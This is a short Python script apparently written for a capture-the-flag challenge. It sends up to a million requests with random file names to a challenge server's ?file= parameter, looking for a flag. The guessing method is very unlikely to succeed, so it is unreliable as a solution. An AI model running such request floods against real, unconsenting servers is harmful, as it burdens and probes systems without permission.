import requests
import random

url = "http://journal.chal.imaginaryctf.org/?file="
chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
for i in range(1000000):  # Adjust the range as needed
    filename = ''.join(random.choices(chars, k=20))
    response = requests.get(url + filename)
    if "ictf" in response.text:
        print(f"Flag found: {response.text}")
        break
